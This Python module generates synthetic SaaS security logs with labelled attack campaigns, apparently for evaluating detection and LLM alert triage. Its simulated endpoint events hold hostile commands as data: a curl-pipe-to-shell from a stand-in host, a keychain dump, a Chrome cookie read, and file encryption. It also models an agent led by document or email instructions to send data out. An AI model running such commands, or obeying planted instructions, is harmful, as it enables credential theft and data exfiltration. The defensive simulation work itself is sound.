"""A simulated SaaS company over four weeks: people logging in, reading and sharing documents, running productivity
agents, calling the cloud and starting processes, and attackers moving along their kill chains among them.

Each log source names people its own way (an email, a numeric user id, a short account name, a hostname, a device
serial, an agent id), as real sources do. The truth of which events belong to an attack stays here."""

from __future__ import annotations

import tomllib
from dataclasses import dataclass, field

import numpy as np

from ..keyed import pick, rng, u
from ..settings import CONFIG

FIRST = [
    "anna",
    "ben",
    "chen",
    "dara",
    "elif",
    "farid",
    "greta",
    "hugo",
    "ines",
    "jonas",
    "kemal",
    "lena",
    "mika",
    "nora",
    "omar",
    "paula",
    "quinn",
    "rosa",
    "sven",
    "tara",
    "umut",
    "vera",
    "wei",
    "yara",
    "zoe",
]
LAST = [
    "adler",
    "becker",
    "costa",
    "dietz",
    "ekin",
    "fischer",
    "gruber",
    "haas",
    "iqbal",
    "jansen",
    "kraus",
    "lange",
    "meyer",
    "nowak",
    "otto",
    "petrov",
    "quast",
    "roth",
    "sauer",
    "thiel",
    "ulrich",
    "vogel",
    "weber",
    "yilmaz",
    "ziegler",
]
DAY = 24 * 60
WORK_START, WORK_LEN = 8 * 60, 10 * 60
CUSTOMERS = ["acme.com", "globex.io", "initech.de", "umbrella.eu", "hooli.com", "stark.co"]
KNOWN_APPS = ["slack", "zoom", "notion", "figma", "salesforce", "github"]
ATTACK_TECH = {
    "account_takeover": {"mfa_fatigue": "T1621", "access": "T1078", "collection": "T1530", "exfil": "T1567"},
    "insider_exfil": {"collection": "T1530", "exfil": "T1567"},
    "oauth_consent": {"grant": "T1528", "collection": "T1550.001", "exfil": "T1567"},
    "agent_injection": {"injection": "AML.T0051", "exfil": "T1567"},
    "cloud_key_abuse": {"discovery": "T1580", "exfil": "T1537"},
    "endpoint_intrusion": {"execution": "T1059", "credentials": "T1003", "lateral": "T1021.004", "impact": "T1486"},
}
IMPACT = {
    "account_takeover": "exfil",
    "insider_exfil": "exfil",
    "oauth_consent": "exfil",
    "agent_injection": "exfil",
    "cloud_key_abuse": "exfil",
    "endpoint_intrusion": "impact",
}


@dataclass
class Person:
    idx: int
    email: str
    user_id: int
    sam: str | None
    dept: str
    country: str
    ip_prefix: str
    serial: str | None
    hostname: str | None
    edr_host: str | None
    agent_id: str | None
    leaving_day: int | None


@dataclass
class Campaign:
    id: str
    kind: str
    person: int
    start: int
    variant: bool
    stages: dict[str, int] = field(default_factory=dict)  # stage -> first minute

    @property
    def impact_at(self) -> int:
        return self.stages[IMPACT[self.kind]]


@dataclass
class World:
    cfg: dict
    people: list[Person] = field(default_factory=list)
    events: list[dict] = field(default_factory=list)
    truth: dict[str, tuple[str, str]] = field(default_factory=dict)  # event id -> (campaign, stage)
    campaigns: list[Campaign] = field(default_factory=list)

    @classmethod
    def load(cls, name: str = "world") -> World:
        w = cls(tomllib.loads((CONFIG / f"{name}.toml").read_text()))
        w._people()
        w._benign()
        w._attacks()
        w.events.sort(key=lambda e: (e["ts"], e["eid"]))
        return w

    # ------------------------------------------------------------- what the company exports
    def directory(self) -> list[dict]:
        """The HR and identity directory export."""
        return [
            {
                "email": p.email,
                "user_id": p.user_id,
                "sam": p.sam,
                "department": p.dept,
                "status": "leaving" if p.leaving_day else ("contractor" if p.sam is None else "active"),
                "last_day": p.leaving_day,
            }
            for p in self.people
        ]

    def inventory(self) -> list[dict]:
        """The device inventory from mobile device management."""
        return [{"serial": p.serial, "hostname": p.hostname, "owner_email": p.email} for p in self.people if p.serial]

    def agents(self) -> list[dict]:
        """Productivity agents and the person each one acts for."""
        return [{"agent_id": p.agent_id, "on_behalf_of": p.user_id} for p in self.people if p.agent_id]

    # ------------------------------------------------------------- people
    def _people(self) -> None:
        c, s = self.cfg, self.cfg["seed"]
        depts = list(c["departments"].items())
        for i in range(c["users"]):
            r, acc, dept = u(s, "dept", i), 0.0, depts[-1][0]
            for d, share in depts:
                acc += share
                if r < acc:
                    dept = d
                    break
            first, last = pick(FIRST, s, "first", i), pick(LAST, s, "last", i)
            contractor = u(s, "contractor", i) < c["contractors"]
            serial = None if contractor else f"C02{int(u(s, 'serial', i) * 1e8):08d}"
            hostname = f"LT-{serial[-6:]}" if serial else None
            edr_host = hostname
            if serial and u(s, "renamed", i) < c["renamed_hosts"]:
                edr_host = f"{first.upper()}-MBP"
            if contractor:
                edr_host = f"EXT-{i:04d}"
            self.people.append(
                Person(
                    i,
                    f"{first}.{last}{i}@corp.example",
                    100000 + i * 7,
                    None if contractor else f"{first[0]}{last}{i}",
                    dept,
                    "DE" if u(s, "country", i) < 0.8 else pick(["NL", "PL", "ES", "FR"], s, "cty", i),
                    f"10.{20 + i % 200}.{i % 250}",
                    serial,
                    hostname,
                    edr_host,
                    f"agt-{int(u(s, 'agent', i) * 1e6):06d}" if u(s, "hasagent", i) < c["agent_users"] else None,
                    c["baseline_days"] + 2 + int(u(s, "leaveday", i) * (c["days"] - c["baseline_days"] - 2))
                    if u(s, "leaver", i) < c["leavers"]
                    else None,
                )
            )

    # ------------------------------------------------------------- events
    def _add(self, src: str, ts: int, fields: dict, campaign: str | None = None, stage: str | None = None) -> str:
        eid = f"{src}-{len(self.events):07d}"
        self.events.append({"eid": eid, "src": src, "ts": int(ts), **fields})
        if campaign:
            self.truth[eid] = (campaign, stage)
        return eid

    def _benign(self) -> None:
        c, b, s = self.cfg, self.cfg["benign"], self.cfg["seed"]
        for p in self.people:
            g = rng(s, "benign", p.idx)
            for day in range(c["days"]):
                if day % 7 >= 5 and g.random() < 0.85:
                    continue
                t = lambda day=day, g=g: day * DAY + WORK_START + int(g.random() * WORK_LEN)  # noqa: E731
                travel = g.random() < b["travel_login"]
                for _ in range(g.poisson(b["logins"])):
                    self._add(
                        "idp",
                        t(),
                        {
                            "actor_email": p.email,
                            "event": "login_success",
                            "src_ip": f"{p.ip_prefix}.{g.integers(2, 250)}",
                            "geo": pick(["US", "SG", "BR", "JP"], s, "trav", p.idx, day) if travel else p.country,
                            "ua": "Chrome",
                        },
                    )
                if g.random() < b["mfa_fail"]:
                    self._add(
                        "idp",
                        t(),
                        {
                            "actor_email": p.email,
                            "event": "mfa_deny",
                            "src_ip": f"{p.ip_prefix}.{g.integers(2, 250)}",
                            "geo": p.country,
                            "ua": "Chrome",
                        },
                    )
                for _ in range(g.poisson(b["doc_views"])):
                    self._add("saas", t(), {"user_id": p.user_id, "action": "doc_view", "doc_id": f"d{g.integers(1, 5000)}", "client_id": "web"})
                for _ in range(g.poisson(b["doc_downloads"])):
                    self._add("saas", t(), {"user_id": p.user_id, "action": "doc_download", "doc_id": f"d{g.integers(1, 5000)}", "client_id": "web"})
                if g.random() < b["external_shares"]:
                    self._add(
                        "saas",
                        t(),
                        {
                            "user_id": p.user_id,
                            "action": "share_external",
                            "doc_id": f"d{g.integers(1, 5000)}",
                            "target_domain": pick(CUSTOMERS, s, "cust", p.idx, day),
                            "client_id": "web",
                        },
                    )
                if g.random() < b["oauth_grants"]:
                    self._add(
                        "idp",
                        t(),
                        {
                            "actor_email": p.email,
                            "event": "oauth_grant",
                            "app": pick(KNOWN_APPS, s, "app", p.idx, day),
                            "scopes": "profile",
                            "src_ip": f"{p.ip_prefix}.9",
                            "geo": p.country,
                            "ua": "Chrome",
                        },
                    )
                if p.agent_id:
                    for _ in range(g.poisson(b["agent_actions"])):
                        ext = g.random() < b["agent_external"]
                        self._add(
                            "agent",
                            t(),
                            {
                                "agent_id": p.agent_id,
                                "on_behalf_of": p.user_id,
                                "app": pick(["mail", "docs", "crm", "calendar"], s, "aapp", g.random()),
                                "action": "send" if ext else pick(["summarize", "draft", "schedule", "read"], s, "aact", g.random()),
                                "destination": pick(CUSTOMERS, s, "adst", g.random()) if ext else "internal",
                                "instruction_source": "user",
                                "bytes": int(g.integers(200, 4000)),
                            },
                        )
                if p.agent_id and g.random() < b["agent_doc_instructions"]:
                    self._add(
                        "agent",
                        t(),
                        {
                            "agent_id": p.agent_id,
                            "on_behalf_of": p.user_id,
                            "app": "docs",
                            "action": "send",
                            "destination": pick(CUSTOMERS, s, "adoc", p.idx, day),
                            "instruction_source": "document",
                            "bytes": int(g.integers(800, 9000)),
                        },
                    )
                if g.random() < b["client_switch"]:
                    for _ in range(int(g.integers(3, 15))):
                        self._add(
                            "saas",
                            t(),
                            {
                                "user_id": p.user_id,
                                "action": "doc_download",
                                "doc_id": f"d{g.integers(1, 5000)}",
                                "client_id": pick(["mobile", "drive-sync"], s, "client", p.idx, day),
                            },
                        )
                if g.random() < b["personal_share"]:
                    self._add(
                        "saas",
                        t(),
                        {
                            "user_id": p.user_id,
                            "action": "share_external",
                            "doc_id": f"d{g.integers(1, 5000)}",
                            "target_domain": "gmail.com",
                            "client_id": "web",
                        },
                    )
                if p.dept == "engineering" and p.sam and g.random() < b["ci_key_calls"]:
                    runner = f"34.{g.integers(100, 140)}.{g.integers(1, 250)}.{g.integers(1, 250)}"
                    for k, ev in enumerate(["GetCallerIdentity", "GetObject", "PutObject"][: int(g.integers(1, 4))]):
                        self._add("cloud", t() + k, {"principal": f"user/{p.sam}-ci", "event_name": ev, "src_ip": runner, "region": "eu-central-1"})
                if p.dept == "engineering" and p.sam:
                    for _ in range(g.poisson(b["cloud_calls"])):
                        self._add(
                            "cloud",
                            t(),
                            {
                                "principal": f"AWSReservedSSO_Engineer/{p.email}",
                                "event_name": pick(["DescribeInstances", "GetObject", "PutObject", "ListBuckets", "AssumeRole"], s, "ce", g.random()),
                                "src_ip": f"{p.ip_prefix}.{g.integers(2, 250)}",
                                "region": "eu-central-1",
                            },
                        )
                if p.edr_host:
                    for _ in range(g.poisson(3)):
                        self._add(
                            "edr",
                            t(),
                            {
                                "hostname": p.edr_host,
                                "user": p.sam or p.email.split("@")[0],
                                "process": pick(["chrome", "slack", "zoom", "code", "python3", "git"], s, "proc", g.random()),
                                "parent": "launchd",
                                "cmdline": "",
                            },
                        )
                    if p.dept == "engineering" and g.random() < b["build_ssh"]:
                        self._add(
                            "edr",
                            t(),
                            {
                                "hostname": f"BUILD-{int(g.integers(1, 6)):02d}",
                                "user": p.sam or p.email.split("@")[0],
                                "process": "sshd",
                                "parent": "launchd",
                                "cmdline": "ssh build",
                            },
                        )
                    if p.dept == "engineering" and g.random() < b["dev_oddities"]:
                        self._add(
                            "edr",
                            t(),
                            {
                                "hostname": p.edr_host,
                                "user": p.sam or p.email,
                                "process": "bash",
                                "parent": "iterm2",
                                "cmdline": pick(
                                    ["curl -fsSL https://get.docker.com | sh", "nc -l 8080", "base64 -d build.b64 > tool"], s, "odd", p.idx, day
                                ),
                            },
                        )
                if p.dept == "it" and g.random() < b["admin_role_grants"]:
                    other = self.people[int(g.integers(0, len(self.people)))]
                    self._add(
                        "idp",
                        t(),
                        {
                            "actor_email": p.email,
                            "event": "admin_role_grant",
                            "target": other.email,
                            "src_ip": f"{p.ip_prefix}.3",
                            "geo": p.country,
                            "ua": "Chrome",
                        },
                    )

    # ------------------------------------------------------------- attacks
    def _attacks(self) -> None:
        c, s = self.cfg, self.cfg["seed"]
        used: set[int] = set()
        for kind, count in c["campaigns"].items():
            if kind == "variant":
                continue
            for k in range(count):
                key = (s, "camp", kind, k)
                pool = {
                    "insider_exfil": [p for p in self.people if p.leaving_day],
                    "cloud_key_abuse": [p for p in self.people if p.dept == "engineering" and p.sam],
                    "agent_injection": [p for p in self.people if p.agent_id],
                    "endpoint_intrusion": [p for p in self.people if p.edr_host],
                }.get(kind, self.people)
                pool = [p for p in pool if p.idx not in used] or [p for p in self.people if p.sam and p.idx not in used]
                p = pick(pool, *key, "who")
                used.add(p.idx)
                lo = c["baseline_days"] + 1
                day = (
                    (p.leaving_day - 1 - int(u(*key, "d") * 2))
                    if kind == "insider_exfil" and p.leaving_day
                    else lo + int(u(*key, "d") * (c["days"] - lo - 3))
                )
                start = max(lo * DAY, day * DAY + WORK_START + int(u(*key, "t") * 6 * 60))
                camp = Campaign(f"{kind}-{k}", kind, p.idx, start, u(*key, "variant") < c["campaigns"]["variant"])
                getattr(self, f"_{kind}")(camp, p, rng(*key))
                self.campaigns.append(camp)

    def _stage(self, camp: Campaign, stage: str, src: str, ts: int, fields: dict) -> str:
        camp.stages.setdefault(stage, int(ts))
        camp.stages[stage] = min(camp.stages[stage], int(ts))
        return self._add(src, ts, fields, camp.id, stage)

    def _account_takeover(self, camp: Campaign, p: Person, g: np.random.Generator) -> None:
        t, ip = camp.start, f"185.{g.integers(10, 250)}.{g.integers(1, 250)}.{g.integers(1, 250)}"
        if not camp.variant:
            pushes, geo = int(g.integers(3, 16)), pick(["RU", "NL", "US", "BR"], camp.id, "geo")
            for i in range(pushes):
                self._stage(
                    camp,
                    "mfa_fatigue",
                    "idp",
                    t + i * int(g.integers(1, 4)),
                    {"actor_email": p.email, "event": "mfa_deny", "src_ip": ip, "geo": geo, "ua": "Chrome"},
                )
            t += 30
            self._stage(camp, "access", "idp", t, {"actor_email": p.email, "event": "login_success", "src_ip": ip, "geo": geo, "ua": "Chrome"})
        else:  # a stolen session cookie replayed through a proxy in the victim's own country: no MFA prompts, a browser agent
            self._stage(camp, "access", "idp", t, {"actor_email": p.email, "event": "login_success", "src_ip": ip, "geo": p.country, "ua": "Chrome"})
        pace = int(g.integers(1, 5))
        for i in range(int(g.integers(40, 160))):
            self._stage(
                camp,
                "collection",
                "saas",
                t + 30 + i * pace,
                {"user_id": p.user_id, "action": "doc_download", "doc_id": f"d{g.integers(1, 5000)}", "client_id": "web"},
            )
        self._stage(
            camp,
            "exfil",
            "saas",
            t + int(g.integers(120, 600)),
            {"user_id": p.user_id, "action": "bulk_export", "doc_id": "*", "target_domain": "files-share.top", "client_id": "web"},
        )

    def _insider_exfil(self, camp: Campaign, p: Person, g: np.random.Generator) -> None:
        t = camp.start
        if not camp.variant:
            for i in range(int(g.integers(80, 160))):
                self._stage(
                    camp,
                    "collection",
                    "saas",
                    t + i * 2,
                    {"user_id": p.user_id, "action": "doc_download", "doc_id": f"d{g.integers(1, 5000)}", "client_id": "web"},
                )
            self._stage(
                camp,
                "exfil",
                "saas",
                t + int(g.integers(300, 700)),
                {
                    "user_id": p.user_id,
                    "action": "share_external",
                    "doc_id": f"d{g.integers(1, 5000)}",
                    "target_domain": "gmail.com",
                    "client_id": "web",
                },
            )
        else:  # slow: a sync client on a personal laptop, then a copy to a USB stick
            for d in range(3):
                for i in range(int(g.integers(12, 20))):
                    self._stage(
                        camp,
                        "collection",
                        "saas",
                        t + d * DAY + i * 9,
                        {"user_id": p.user_id, "action": "doc_download", "doc_id": f"d{g.integers(1, 5000)}", "client_id": "drive-sync"},
                    )
            host = p.edr_host or f"EXT-{p.idx:04d}"
            self._stage(
                camp,
                "exfil",
                "edr",
                t + 2 * DAY + 300,
                {"hostname": host, "user": p.sam or p.email, "process": "cp", "parent": "zsh", "cmdline": "cp -r ~/Drive /Volumes/USB-STICK/"},
            )

    def _oauth_consent(self, camp: Campaign, p: Person, g: np.random.Generator) -> None:
        t, app = camp.start, f"pdf-tools-{g.integers(100, 999)}"
        scopes, pace = ("files.read contacts", 3) if camp.variant else ("drive.readonly mail.read", 1)
        self._stage(
            camp,
            "grant",
            "idp",
            t,
            {
                "actor_email": p.email,
                "event": "oauth_grant",
                "app": app,
                "scopes": scopes,
                "src_ip": f"{p.ip_prefix}.9",
                "geo": p.country,
                "ua": "Chrome",
            },
        )
        for i in range(int(g.integers(120, 400))):
            self._stage(
                camp,
                "collection",
                "saas",
                t + 60 + i * pace,
                {"user_id": p.user_id, "action": "doc_view", "doc_id": f"d{g.integers(1, 5000)}", "client_id": app},
            )
        self._stage(
            camp,
            "exfil",
            "saas",
            t + int(g.integers(300, 900)),
            {"user_id": p.user_id, "action": "bulk_export", "doc_id": "*", "target_domain": "pdf-tools.app", "client_id": app},
        )

    def _agent_injection(self, camp: Campaign, p: Person, g: np.random.Generator) -> None:
        t = camp.start
        src = "email" if camp.variant else "document"
        self._stage(
            camp,
            "injection",
            "agent",
            t,
            {
                "agent_id": p.agent_id,
                "on_behalf_of": p.user_id,
                "app": "mail" if camp.variant else "docs",
                "action": "read",
                "destination": "internal",
                "instruction_source": src,
                "bytes": 1200,
            },
        )
        for i in range(int(g.integers(3, 8))):
            self._stage(
                camp,
                "exfil",
                "agent",
                t + 5 + i * 3,
                {
                    "agent_id": p.agent_id,
                    "on_behalf_of": p.user_id,
                    "app": "mail",
                    "action": "send",
                    "destination": "collector-relay.net",
                    "instruction_source": src,
                    "bytes": int(g.integers(2000, 9000) if camp.variant else g.integers(40000, 200000)),
                },
            )

    def _cloud_key_abuse(self, camp: Campaign, p: Person, g: np.random.Generator) -> None:
        t = camp.start
        if camp.variant:
            ip, region, calls = f"34.{g.integers(100, 140)}.{g.integers(1, 250)}.7", "eu-central-1", ["GetCallerIdentity", "DescribeSnapshots"]
        else:
            ip, region, calls = (
                f"{g.integers(80, 95)}.{g.integers(1, 250)}.{g.integers(1, 250)}.7",
                "us-east-1",
                ["GetCallerIdentity", "ListBuckets", "DescribeInstances", "ListUsers", "DescribeSnapshots"],
            )
        for i, ev in enumerate(calls):
            self._stage(camp, "discovery", "cloud", t + i * 2, {"principal": f"user/{p.sam}-ci", "event_name": ev, "src_ip": ip, "region": region})
        self._stage(
            camp,
            "exfil",
            "cloud",
            t + int(g.integers(30, 240)),
            {"principal": f"user/{p.sam}-ci", "event_name": "ModifySnapshotAttribute", "src_ip": ip, "region": region},
        )

    def _endpoint_intrusion(self, camp: Campaign, p: Person, g: np.random.Generator) -> None:
        t, host, user = camp.start, p.edr_host, p.sam or p.email
        if camp.variant:
            self._stage(
                camp,
                "execution",
                "edr",
                t,
                {"hostname": host, "user": user, "process": "osascript", "parent": "Finder", "cmdline": "osascript -e 'do shell script \"/tmp/.u\"'"},
            )
            self._stage(
                camp,
                "credentials",
                "edr",
                t + 20,
                {
                    "hostname": host,
                    "user": user,
                    "process": "sqlite3",
                    "parent": "sh",
                    "cmdline": "sqlite3 ~/Library/Application Support/Google/Chrome/Default/Cookies",
                },
            )
        else:
            self._stage(
                camp,
                "execution",
                "edr",
                t,
                {"hostname": host, "user": user, "process": "sh", "parent": "Mail", "cmdline": "curl -s http://cdn-update.io/i.sh | sh"},
            )
            self._stage(
                camp,
                "credentials",
                "edr",
                t + 20,
                {"hostname": host, "user": user, "process": "security", "parent": "sh", "cmdline": "security dump-keychain -d login.keychain"},
            )
        other = pick([q for q in self.people if q.edr_host and q.idx != p.idx], self.cfg["seed"], "lat", camp.id)
        lat = int(g.integers(40, 120))
        self._stage(
            camp,
            "lateral",
            "edr",
            t + lat,
            {"hostname": other.edr_host, "user": user, "process": "sshd", "parent": "launchd", "cmdline": f"ssh {user}@{other.edr_host}"},
        )
        self._stage(
            camp,
            "impact",
            "edr",
            t + lat + int(g.integers(30, 240)),
            {"hostname": other.edr_host, "user": user, "process": "python3", "parent": "sshd", "cmdline": "python3 enc.py --rename *.docx *.locked"},
        )

    # ------------------------------------------------------------- the model and the people
    def index(self) -> dict[str, dict]:
        if not hasattr(self, "_index"):
            self._index = {e["eid"]: e for e in self.events}
        return self._index

    def attack_of(self, eids: list[str]) -> str | None:
        hits = [self.truth[e][0] for e in eids if e in self.truth]
        return hits[0] if hits else None

    def triage(self, alert_key: str, eids: list[str], context: bool) -> dict:
        """An LLM's verdict and the claims in its report. Draws keyed by the alert, never by the design."""
        m, s = self.cfg["llm"], self.cfg["seed"]
        attack = self.attack_of(eids) is not None
        if attack:
            escalate = u(s, "llm-esc", alert_key) < (m["escalate_attack_with_context"] if context else m["escalate_attack"])
        else:
            escalate = u(s, "llm-close", alert_key) >= (m["close_benign_with_context"] if context else m["close_benign"])
        by_id = self.index()
        claims = []
        for i in range(min(m["claims_per_report"], len(eids))):
            ev = by_id[pick(eids, s, "claim", alert_key, i)]
            fld = pick([k for k in ev if k not in ("eid", "src", "ts")], s, "cf", alert_key, i)
            claim = {"eid": ev["eid"], "field": fld, "value": ev[fld]}
            if u(s, "fab", alert_key, i) < m["fabricated_claim"]:
                claim = (
                    {"eid": f"{ev['src']}-9{int(u(s, 'fid', alert_key, i) * 1e6):06d}", "field": fld, "value": ev[fld]}
                    if u(s, "fabkind", alert_key, i) < 0.5
                    else {"eid": ev["eid"], "field": fld, "value": f"{ev[fld]}-x"}
                )
            claims.append(claim)
        return {"escalate": escalate, "claims": claims}

    def analyst(self, item_key: str, ts: int, load: int, page: bool) -> tuple[int, bool]:
        """When a person looks at an item and whether they miss the attack in it. A page reaches the on-call engineer
        at any hour; the queue is worked in office hours, slower the longer it is. Tired people miss more."""
        a = self.cfg["analysts"]
        if page:
            at = ts + a["page_minutes"]
        else:
            day, minute = divmod(ts, DAY)
            start = ts if WORK_START <= minute < WORK_START + WORK_LEN else (day + (minute >= WORK_START)) * DAY + WORK_START
            at = start + int(a["minutes_per_alert"] * (1 + load / a["on_shift"] / 2))
        p = a["miss_when_rested"] + max(0, load - a["capacity_per_day"]) * a["miss_per_extra_alert"]
        return at, u(self.cfg["seed"], "analyst", item_key) < min(0.9, p)

    def person_reads(self, item_key: str, ts: int, load: int, page: bool, eids: list[str]) -> tuple[int, str]:
        """A person reads an item: an attack they do not miss becomes an incident; everything else is closed."""
        at, missed = self.analyst(item_key, ts, load, page)
        return at, "incident" if self.attack_of(eids) and not missed else "benign"
